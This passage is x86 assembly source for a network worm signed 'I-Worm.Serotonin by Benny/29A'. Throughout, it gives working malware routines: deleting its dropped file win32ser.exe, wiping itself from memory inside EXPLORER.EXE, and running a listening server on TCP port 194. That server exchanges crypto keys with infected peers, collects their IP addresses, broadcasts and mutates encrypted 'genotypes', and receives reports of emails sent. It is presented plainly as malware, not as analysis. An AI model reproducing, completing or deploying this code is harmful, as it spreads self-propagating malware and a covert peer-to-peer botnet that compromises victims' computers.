	mov	eax,'niw\'
	stosd
	mov	eax,'es23'
	stosd
	mov	eax,'xe.r'
	stosd
	mov	ax,'e'
	stosw					;construct %sysdir%\win32ser.exe
	call	[ebp + _DeleteFileA - tgdelta]	;delete temporary file



;destroy worm body in memory -	copy small code to .reloc section which will delete
;				all worm body and terminate worm's main thread

destroy_worm:
	mov	ebx,12345678h
module_base = dword ptr $-4			;address of EXPLORER.EXE
	mov	eax,[ebx.MZ_lfanew]
	add	eax,ebx
	mov	edi,[eax.NT_OptionalHeader.OH_DirectoryEntries.DE_BaseReloc.DD_VirtualAddress]
	test	edi,edi
	je	end_seh				;check for .reloc section presence
	cmp	[eax.NT_OptionalHeader.OH_DirectoryEntries.DE_BaseReloc.DD_Size],ender_end-Ender
	jb	end_seh				;check its size
	add	edi,ebx

	lea	eax,[ebp + tmp - tgdelta]
	push	eax
	push	PAGE_READWRITE
	push	ender_end-Ender
	push	edi
	mov	eax,12345678h
_VirtualProtect = dword ptr $-4
	call	eax				;unprotect 1st page in .reloc section

	push	edi
	lea	esi,[ebp + Ender - tgdelta]
	mov	ecx,ender_end-Ender
	rep	movsb				;copy there ender code
	pop	edi

	push	MEM_RELEASE
	push	0
	push	12345678h
worm_base = dword ptr $-4
	mov	eax,12345678h
_VirtualFree = dword ptr $-4
	jmp	edi				;jump to ender code
rtStart	EndP






;ender code - deletes worm body from memory and terminates itself

Ender	Proc
	call	eax				;release all worm pages
	push	0
	mov	eax,12345678h
_ExitThread = dword ptr $-4
	call	eax				;and terminate worm's main thread
ender_end:
Ender	EndP






;create crypto context and key pair

crypt_create_context:
	push	10h
	push	1
	push	0
	lea	esi,[ebp + mutexName - tgdelta]
	push	esi
	lea	ebx,[ebp + cProvider - tgdelta]
	push	ebx
	mov	edi,12345678h
_CryptAcquireContextA = dword ptr $-4
	call	edi				;delete crypto context

	push	8
	push	1
	push	0
	push	esi
	push	ebx
	call	edi				;create new one
	dec	eax
	jne	err_ccc

	lea	esi,[ebp + cKey - tgdelta]
	push	esi
	push	0
	push	1
	push	dword ptr [ebp + cProvider - tgdelta]
	mov	eax,12345678h
_CryptGenKey = dword ptr $-4
	call	eax				;create new public/private key pair
	clc
	ret					;CF=0, everything OK
err_ccc:stc
	ret					;CF=1, error occured



wsa_startup:
	lea	eax,[ebp + WSAData - tgdelta]
	push	eax
	push	101h
	mov	eax,12345678h
_WSAStartup = dword ptr $-4
	call	eax				;initialize WSOCK32.DLL
	test	eax,eax
	ret



create_socket:
	push	0
	push	1
	push	2
	mov	eax,12345678h
_socket = dword ptr $-4
	call	eax				;create socket
	inc	eax
	ret



export_key:
	lea	eax,[ebp + pubkey_size - tgdelta]
	mov	dword ptr [eax],public_key_length
	push	eax
	lea	eax,[ebp + public_key - tgdelta]
	push	eax
	push	0
	push	6
	push	0
	push	dword ptr [ebp + cKey - tgdelta]
	mov	eax,12345678h
_CryptExportKey = dword ptr $-4
	call	eax				;export public key
	dec	eax
	ret



import_key:
	lea	eax,[ebp + cXchgKey - tgdelta]
	push	eax
	push	0
	push	0
	push	ebx
	push	edi
	push	12345678h
cProvider = dword ptr $-4
	mov	eax,12345678h
_CryptImportKey = dword ptr $-4
	call	eax				;import public key
	dec	eax
	ret



crypt_decrypt:
	lea	eax,[ebp + tmp - tgdelta]
	mov	dword ptr [eax],75h
	push	eax
	push	edi
	push	0
	push	0
	push	0
	push	12345678h
cKey = dword ptr $-4
	mov	eax,12345678h
_CryptDecrypt = dword ptr $-4
	call	eax				;decrypt one block
	ret



crypt_encrypt:
	lea	eax,[ebp + tmp - tgdelta]
	mov	[eax],ebx
	push	80h				;encrypted text block size
	push	eax				;size of plaintext to encrypt
	push	edi				;address of plaintext
	push	0
	push	0
	push	0
	push	12345678h
cXchgKey = dword ptr $-4
	mov	eax,12345678h
_CryptEncrypt = dword ptr $-4
	call	eax				;encrypt one block
	ret






crypt_decrypt_final:
	lea	esi,[ebp + tmp - tgdelta]
	mov	[esi],ecx
	push	esi
	push	edi
	push	0
	push	1
	push	0
	push	dword ptr [ebp + cKey - tgdelta]
	call	[ebp + _CryptDecrypt - tgdelta]	;decrypt final block
	ret



crypt_encrypt_final:
	lea	eax,[ebp + tmp - tgdelta]
	mov	[eax],ecx
	push	80h
	push	eax
	push	edi
	push	0
	push	1
	push	0
	push	dword ptr [ebp + cXchgKey - tgdelta]
	call	[ebp + _CryptEncrypt - tgdelta]	;encrypt final block
	ret






copy_manifest:
	call	cm_new_eh			;__try block


	;__except block

	mov	ecx,[esp.EH_ContextRecord]	;get address of context
	mov	esi,[ecx.CONTEXT_Esi]		;repair ESI register
	mov	edi,[ecx.CONTEXT_Edi]		;repair EDI register
	mov	ecx,[ecx.CONTEXT_Ecx]		;repair ECX register
	mov	esp,[esp.EH_EstablisherFrame]	;repair ESP register

	call	alloc_page			;allocate next page
	@SEH_RemoveFrame			;remove SEH handler
	jmp	copy_manifest			;and try again



cm_new_eh:
	xor	edx,edx
	push	dword ptr fs:[edx]
	mov	fs:[edx],esp
	rep	movsb				;copy new manifest over the worm body
	@SEH_RemoveFrame			;remove SEH handler
	ret






;Server thread procedure

ServerThread	Proc
	pushad
	@SEH_SetupFrame	<jmp	st_end>		;__try block

	mov	ebp,[esp.cPushad+12]		;get delta offset


	;INITIALIZATION...


	call	crypt_create_context		;initialize crypt32.dll
	jc	st_end
	call	wsa_startup			;initialize wsock32.dll
	jne	crypt_st_end

	call	create_socket			;create socket
	je	wsa_st_end
	dec	eax
	mov	[ebp + hSocket2 - tgdelta],eax	;save its handle


	push	10h
	call	@socket
st_socket:
	dw	2
	dw	0C200h				;TCP port 194
	dd	0100007Fh
	dq	?
@socket:
	push	dword ptr [ebp + hSocket2 - tgdelta]
	mov	eax,12345678h
_bind = dword ptr $-4
	call	eax				;bind to TCP port 194

	push	20
	push	dword ptr [ebp + hSocket2 - tgdelta]
	mov	eax,12345678h
_listen = dword ptr $-4
	call	eax				;switch to listen mode
	test	eax,eax
	jne	socket_st_end

	and	[ebp + num_of_clients - tgdelta],eax
						;nulify "number of handled clients"
						;variable
	mov	eax,12345678h
_GetTickCount = dword ptr $-4
	call	eax				;get current count of ticks
	mov	[ebp + st_ticks - tgdelta],eax	;save it


server_loop:
	lea	eax,[ebp + st_socket - tgdelta]	;get ptr to socket structure
	call	_ten
	dd	10h
_ten:	push	eax
	push	dword ptr [ebp + hSocket2 - tgdelta]
	mov	eax,12345678h
_accept = dword ptr $-4
	call	eax				;wait for incomming data
	mov	[ebp + hSocket - tgdelta],eax	;save new socket



	;ACCEPTING WORM'S PUBLIC KEY...


	call	get_response5			;get response from worm
	jc	socket_server_loop		;quit if error
	cmp	byte ptr [edi],WORMNET_SENDKEY	;does it send its public key?
	jne	socket_server_loop		;quit if not
	mov	ecx,[edi+1]			;get size of data
	mov	ebx,ecx				;to EBX
	lea	edi,[ebp + public_key - tgdelta];ptr to public key storage
	call	get_response			;store public key
	jc	socket_server_loop		;quit if error

	call	import_key			;import worm's public key
	jne	socket_server_loop		;quit if error


	;SENDING ITS OWN PUBLIC KEY...


	call	export_key			;export its own public key
	jne	key_server_loop			;quit if error


	mov	ecx,[ebp + pubkey_size - tgdelta]
	mov	[ebp + response+1 - tgdelta],ecx
						;save size of its own public key
	lea	esi,[ebp + public_key - tgdelta];get ptr to public key
	pushad
	push	5
	pop	ecx
	lea	esi,[ebp + response - tgdelta]
	call	write_socket			;send header
	popad
	call	write_socket			;send data (public key)


	;PUBLIC KEYZ ARE ALREADY EXCHANGED, STORE WORM'S IP ADDRESS...


	lea	ecx,[ebp + MANIFEST - tgdelta]	;get ptr to MANIFEST
	mov	edi,[ecx.MAN_IPSPTR]		;get rva to IP storage
	add	edi,ecx				;normalize to va ptr
	mov	eax,[ecx.MAN_IPSNUM]		;get number of IPs
	imul	eax,4				; * 4 (size of one IP)
	add	edi,eax				;get to end of 
	lea	eax,[ebp + st_socket+4 - tgdelta]
						;get IP address of the worm
	pushad
	call	new_eh				;__try block

	;__except block

	mov	ecx,[esp.EH_ContextRecord]
	mov	edi,[ecx.CONTEXT_Edi]
	mov	eax,[ecx.CONTEXT_Eax]
	mov	ebp,[ecx.CONTEXT_Ebp]
	mov	esp,[esp.EH_EstablisherFrame]
	call	alloc_page			;allocate next page
	jmp	q_seh

new_eh:	xor	edx,edx
	push	dword ptr fs:[edx]
	mov	fs:[edx],esp
q_seh:	stosd					;store new IP to IP storage
	@SEH_RemoveFrame
	popad
	inc	dword ptr [ecx.MAN_IPSNUM]	;increment "number of IPs" variable

	mov	[ebp + st_genotype_only - tgdelta],ebp
						;de-nulify this variable

	;PERFORM CHECKS AND RECIEVE ENCRYPTED GENOTYPE...


	call	get_response5			;get response
	jc	key_server_loop			;quit if error
	mov	al,[edi]			;get status code
	cmp	al,WORMNET_SENDGENOTYPEONLY	;is it genotype broadcast?
	jne	server_nextcheck		;no, continue

	and	dword ptr [ebp + st_genotype_only - tgdelta],0
	jmp	server_overcheck		;nulify variable and continue

server_nextcheck:
	cmp	al,WORMNET_SENDGENOTYPE		;does the worm send genotype?
	jne	key_server_loop			;no, quit

server_overcheck:
	mov	ecx,[edi+1]			;get size of encrypted genotype
	mov	ebx,ecx				;to EBX
	call	alloc_memory			;allocate memory for it
	je	key_server_loop			;quit if error
	mov	[ebp + st_mem_genotype - tgdelta],eax
	xchg	eax,edi				;save memory ptr
	mov	ecx,ebx
	call	get_response			;recieve encrypted genotype
	jc	key_server_loop			;quit if error


	;DECRYPT RECIEVED GENOTYPE...


	mov	ecx,ebx
	and	dword ptr [ebp + st_gen_size - tgdelta],0
	push	80h
	pop	ebx				;EBX = encrypted block size
	mov	esi,edi				;initialize pointerz
st_decrypt_loop:
	pushad
	mov	ecx,ebx
	rep	movsb				;copy one block to continuous plaintext block
	popad
	push	ecx
	cmp	ecx,ebx				;is it last block?
	je	st_decrypt_final

	call	crypt_decrypt			;decrypt one block
	push	75h
	pop	eax
	pop	ecx
	sub	ecx,ebx
	add	edi,eax
	add	esi,ebx				;correct variables and continue
	add	[ebp + st_gen_size - tgdelta],eax
	jmp	st_decrypt_loop



st_decrypt_final:
	pop	ecx
	call	crypt_decrypt_final	;decrypt final block
	mov	eax,[esi]
	add	[ebp + st_gen_size - tgdelta],eax



	mov	eax,0			;broadcast this genotype?
mut_nonstop_traffic = dword ptr $-4
	test	eax,eax
	je	st_end_broadcast+1	;no, dont send it to other worms
					;(no nonstop network traffic thru this computer)


	;BROADCAST GENOTYPE TO ALL KNOWN WORMS...


	lea	esi,[ebp + MANIFEST - tgdelta]	;get ptr to MANIFEST
	mov	eax,[esi.MAN_IPSPTR]		;get rva to IP storage
	mov	ecx,[esi.MAN_IPSNUM]		;get count of stored IPs
	add	esi,eax				;get va ptr to IP storage
st_ip_loop:
	pushad

	call	create_socket			;create socket
	je	st_end_broadcast		;quit if error
	dec	eax
	mov	[ebp + hSocket3 - tgdelta],eax	;save it

	lodsd					;get IP from IP storage
	cmp	eax,0100007Fh
	je	st_next_ip			;discard localhost entry

	pushad
	push	160
	lea	esi,[ebp + filename - tgdelta]
	push	esi
	mov	eax,12345678h
_gethostname = dword ptr $-4
	call	eax			;get name of this computer

	push	esi
	mov	eax,12345678h
_gethostbyname = dword ptr $-4
	call	eax			;get IP address of this computer
	mov	eax,[eax+14h]
	mov	eax,[eax]
	cmp	eax,[esp.Pushad_eax]	;is the IP of worm the same as IP of this computer?
	popad
	je	st_next_ip		;yeah, get next IP
	mov	[ebp + socket_address3 - tgdelta],eax
					;save address of worm

	push	sizeofsocket
	call	@st_socket
		dw	2
		dw	0C200h
socket_address3	dd	?
		db	8 dup (?)
@st_socket:
	push	dword ptr [ebp + hSocket3 - tgdelta]
	call	[ebp + _connect - tgdelta]	;connect to worm
	test	eax,eax
	jne	st_next_ip			;quit if error

	call	genotype_broadcast		;send genotype there
st_next_ip:
	push	12345678h
hSocket3 = dword ptr $-4
	call	[ebp + _closesocket - tgdelta]	;close connection
	popad
	dec	ecx
	jne	st_ip_loop			;and get next IP
	pushad
st_end_broadcast:
	popad


	;PAIR TWO GENOTYPES AND MUTATE THE RESULT...


	call	@pair_ebx
	dd	?
	dd	?
@pair_ebx:
	pop	ebx
	mov	eax,[ebp + st_mem_genotype - tgdelta]
	mov	[ebx],eax		;save address of new genotype as argument
	lea	eax,[ebp + GENOTYPE - tgdelta]
	mov	[ebx+4],eax		;save address of old genotype as argument
	push	GEN_PAIRGENOTYPES
	call	activate_gen		;pair these genotypes into one
	xchg	eax,ebx			;new genotype ptr to EBX

	push	GEN_MUTATEGENOTYPE
	call	activate_gen			;mutate this genotype
	xchg	eax,esi

	mov	eax,12345678h
st_mem_genotype = dword ptr $-4
	call	dealloc_memory			;deallocate genotype memory


	;CREATE MANIFEST BASED ON NEW GENOTYPE AND IP STORAGE...


	push	esi
	lea	edx,[ebp + MANIFEST - tgdelta]
	mov	ecx,[edx.MAN_IPSNUM]
	add	edx,[edx.MAN_IPSPTR]

	push	ecx
	push	edx
	push	ecx

	imul	ecx,4					;number of bytez for IPs
	add	ecx,8					;8-byte for manifest header
	add	ecx,ebx					; + size of genotype
	mov	[ebp + st_newmanifestsize - tgdelta],ecx
	call	alloc_memory				;allocate memory of calculated size
	mov	[ebp + st_newmanifest - tgdelta],eax	;save address
	xchg	eax,edi
	mov	eax,ebx					;EAX = size of genotype
	mov	ecx,ebx					;ECX = EAX
	add	eax,8					;EAX += 8 (header size)
	stosd						;save relative ptr to IPs

	pop	eax
	stosd						;save count of IPs
	rep	movsb					;copy genotype
	pop	esi					;get ptr to IPs
	pop	ecx					;get count of IPs
	rep	movsd					;copy IPs

	pop	eax
	call	dealloc_memory				;deallocate genotype memory

	mov	ecx,12345678h				;the flag - client worm sent
st_genotype_only = dword ptr $-4			;only genotype, replace old
	jecxz	replace_manifest			;manifest with the new one
							;and close connection with client
							;(broadcast case)
	;ENCRYPT THE MANIFEST IN MEMORY


	and	dword ptr [ebp + st_man_size - tgdelta],0
	mov	eax,12345678h				;ECX = size of whole plaintext
st_newmanifestsize = dword ptr $-4
	push	eax
	imul	eax,80h					;round the size
	cdq						;of the buffer
	push	75h					;on an encrypted block size
	pop	ecx					;(EAX *= 80h/70h)
	div	ecx
	xchg	eax,ecx
	call	alloc_memory
	pop	ecx
	je	key_server_loop
	xchg	eax,edi

	push	75h
	pop	ebx					;EBX = plain text block size
	mov	esi,[ebp + st_newmanifest - tgdelta]	;ESI = start of manifest in memory
	push	edi
st_crypt_loop:
	push	ecx
	push	ecx
	push	edi
	mov	ecx,ebx
	rep	movsb					;copy plaintext over the buffer
	pop	edi
	pop	ecx
	cmp	ecx,ebx
	jb	st_crypt_final				;is it last block?
	je	st_crypt_final

	call	crypt_encrypt				;encrypt one block
	pop	ecx
	mov	eax,[ebp + tmp - tgdelta]
	add	edi,eax
	sub	ecx,ebx
	add	[ebp + st_man_size - tgdelta],eax
	jmp	st_crypt_loop				;correct variablez and continue



replace_manifest:
	mov	esi,[ebp + st_newmanifest - tgdelta]
	lea	edi,[ebp + MANIFEST - tgdelta]
	mov	ecx,[ebp + st_newmanifestsize - tgdelta]
	call	copy_manifest
	jmp	key_server_loop



;encrypt the last block

st_crypt_final:
	pop	ecx
	call	crypt_encrypt_final

	mov	ecx,12345678h
st_man_size = dword ptr $-4
	add	ecx,[ebp + tmp - tgdelta]	;ECX = size of encrypted manifest


	;SEND ENCRYPTED MANIFEST TO CLIENT WORM


	push	ecx
	lea	esi,[ebp + protocol_MAGIC - tgdelta]
	mov	byte ptr [esi],WORMNET_SENDMANIFEST
	mov	[esi+1],ecx
	push	5
	pop	ecx
	call	write_socket			;send header to worm
	pop	ecx
	pop	esi
	call	write_socket			;send manifest to worm
	mov	eax,esi
	call	dealloc_memory


	;RECIEVE ENCRYPTED REPORT AND DECRYPT IT


	call	get_response5			;get response
	jc	key_server_loop

	mov	eax,12345678h
st_newmanifest = dword ptr $-4
	call	dealloc_memory

	cmp	byte ptr [edi],WORMNET_SENDREPORT
	jne	key_server_loop			;must be WORMNET_SENDREPORT

	mov	ecx,[edi+1]
	push	ecx
	lea	edi,[ebp + @report-80h - tgdelta]
	call	get_response			;recieve report
	jc	key_server_loop

	pop	ecx
	lea	eax,[ebp + tmp - tgdelta]
	mov	[eax],ecx
	push	eax
	push	edi
	push	0
	push	1
	push	0
	push	dword ptr [ebp + cKey - tgdelta]
	call	[ebp + _CryptDecrypt - tgdelta]	;decrypt last block

	call	get_response5			;synchronization with client

	push	GEN_CUSTOM			;activate custom routine stored
	call	activate_gen			;in genotype

	inc	dword ptr [ebp + num_of_clients - tgdelta]
						;increment "number of handled clients"
						;variable

	;ANALYSE REPORT AND STATUS VARIABLES


	mov	eax,[edi.REP_MAILNUM]		;get number of sent emails
	mov	ecx,100				;get limit variable
mut_mailnum = dword ptr $-4
	cmp	ecx,eax
	jb	st_terminate			;quit if limit exceeded

	mov	eax,[edi.REP_IPSNUM]		;get number of IPs stored in client's manifest
	mov	ecx,100				;get limit variable
mut_ipsnum = dword ptr $-4
	cmp	ecx,eax
	jb	st_terminate			;quit if limit exceeded

	mov	eax,12345678h			;get number of handled clients
num_of_clients = dword ptr $-4
	mov	ecx,100				;get limit variable
mut_clientnum = dword ptr $-4
	cmp	ecx,eax
	jb	st_terminate			;quit if limit exceeded


	call	[ebp + _GetTickCount - tgdelta]	;get current count of ticks
	sub	eax,12345678h			; - saved count of ticks
st_ticks = dword ptr $-4
	xor	edx,edx
	mov	ecx,60*1000
	div	ecx				; / 60 seconds (convert miliseconds to minutes)
		db	3Dh			;CMP	EAX,LARGE ...
mut_time	dd	30			; ... 30
	jb	key_server_loop			;quit if running longer than 30 minutes


	;TERMINATE SERVER


st_terminate:
	lea	edi,[ebp + st_patch - tgdelta]	;get instruction to patch
	mov	eax,90909090h			;4 x NOP (90h)
	stosd					;overwrite 4 bytez with NOPs
	stosb					;overwrite 1 byte with NOP



key_server_loop:				;destroy client's public key
	push	dword ptr [ebp + cXchgKey - tgdelta]
	call	[ebp + _CryptDestroyKey - tgdelta]
socket_server_loop:
	push	dword ptr [ebp + hSocket - tgdelta]
	call	[ebp + _closesocket - tgdelta]	;close connection
st_patch:					;instruction to patch...
	jmp	server_loop			;...handle next client


	;CLEAN & QUIT


socket_st_end:
	push	12345678h
hSocket2 = dword ptr $-4
	call	[ebp + _closesocket - tgdelta]	;close listening socket
wsa_st_end:
	call	[ebp + _WSACleanup - tgdelta]	;unitialize WSOCK32.dll
crypt_st_end:
	push	dword ptr [ebp + cKey - tgdelta]
	call	[ebp + _CryptDestroyKey - tgdelta]
						;destroy worm's public key
	push	0
	push	dword ptr [ebp + cProvider - tgdelta]
	call	[ebp + _CryptReleaseContext - tgdelta]
						;unitialize CRYPT32.dll context
st_end:	@SEH_RemoveFrame			;remove SEH frame
	popad					;restore all GP registers
	ret					;and quit






;send recieved genotype to another worm

genotype_broadcast:
	lea	eax,[ebp + hSocket - tgdelta]
	push	dword ptr [eax]
	push	dword ptr [ebp + cXchgKey - tgdelta]
	mov	ecx,[ebp + hSocket3 - tgdelta]
	mov	[eax],ecx			;save crucial variables (socket, key handle)

	lea	esi,[ebp + protocol_MAGIC - tgdelta]
	mov	byte ptr [esi],WORMNET_SENDKEY
	mov	ecx,12345678h
pubkey_size = dword ptr $-4
	mov	[esi+1],ecx
	add	ecx,5
	call	write_socket			;send public key

	call	get_response5
	jc	end_gb
	cmp	byte ptr [edi],WORMNET_SENDKEY
	jne	end_gb
	mov	ecx,[edi+1]
	mov	ebx,ecx
	push	ecx
	call	alloc_memory
	xchg	eax,edi
	pop	ecx
	push	edi
	call	get_response			;recieve public key
	call	import_key			;and import it
	pop	eax
	call	dealloc_memory

	mov	eax,12345678h
st_gen_size = dword ptr $-4
	push	eax
	imul	eax,80h
	push	75h
	pop	ecx
	cdq
	div	ecx
	xchg	eax,ecx
	call	alloc_memory			;allocate memory for encrypted genotype
	pop	ecx
	je	end_gb_key
	mov	[ebp + st_mem_genotype2 - tgdelta],eax
	xchg	eax,edi


	;encrypt genotype before sending

	and	dword ptr [ebp + st_gen_size2 - tgdelta],0
	push	75h
	pop	ebx
	mov	esi,[ebp + st_mem_genotype - tgdelta]
gb_crypt_loop:
	push	ecx
	push	ecx
	push	edi
	mov	ecx,ebx
	rep	movsb
	pop	edi
	pop	ecx
	cmp	ecx,ebx
	jb	gb_crypt_final
	je	gb_crypt_final

	call	crypt_encrypt			;encrypt one block

	pop	ecx
	mov	eax,[ebp + tmp - tgdelta]
	add	edi,eax
	sub	ecx,ebx
	add	[ebp + st_gen_size2 - tgdelta],eax
	jmp	gb_crypt_loop

gb_crypt_final:
	pop	ecx
	call	crypt_encrypt_final		;encrypt final block

	mov	ecx,12345678h
st_gen_size2 = dword ptr $-4
	add	ecx,[ebp + tmp - tgdelta]
						;ECX = size of encrypted genotype

	lea	esi,[ebp + protocol_MAGIC - tgdelta]
	mov	byte ptr [esi],WORMNET_SENDGENOTYPEONLY
	mov	[esi+1],ecx
	push	ecx
	push	5
	pop	ecx
	call	write_socket			;send header
	mov	esi,[ebp + st_mem_genotype2 - tgdelta]
	pop	ecx
	call	write_socket			;send genotype

	mov	eax,12345678h
st_mem_genotype2 = dword ptr $-4
	call	dealloc_memory

end_gb_key:					;close public key handle
	push	dword ptr [ebp + cXchgKey - tgdelta]
	call	[ebp + _CryptDestroyKey - tgdelta]
end_gb:	pop	dword ptr [ebp + cXchgKey - tgdelta]	;restore public key handle
	pop	dword ptr [ebp + hSocket - tgdelta]	;restore socket handle
	ret					;and quit
ServerThread	EndP



signature	db	CRLF,'I-Worm.Serotonin by Benny/29A',CRLF


socket		dw	2			;socket structure
		dw	0C200h			;port (194)
socket_address	dd	?			;IP address
		db	8 dup (?)
sizeofsocket = $-socket


WSAData:	dw	?			;WSAData structure
		dw	?
		db	257 dup (?)
		db	129 dup (?)
		dw	?
		dw	?
		dd	?

org		WSAData
filename	db	MAX_PATH dup (?)
procz		dd	100h dup (?)
		dd	?
modz		dd	?
mod_name	db	MAX_PATH dup (?)
p_token		dd	?
org		WSAData


protocol_MAGIC	db	WORMNET_SENDKEY		;magic number
protocol_SIZE	dd	?			;size of data

public_key	db	1000h dup (?)		;maximal size of key
public_key_length	= 1000h

tmp		dd	?


;MANIFEST (GENOTYPE + IP storage):

MANIFEST	dd	IPs-MANIFEST		;RVA of IP storage
		dd	1			;number of IP entries
include	genotype.inc				;include genotype file
IPs		dd	0100007Fh		;IP address


_virtual_end:
End	Start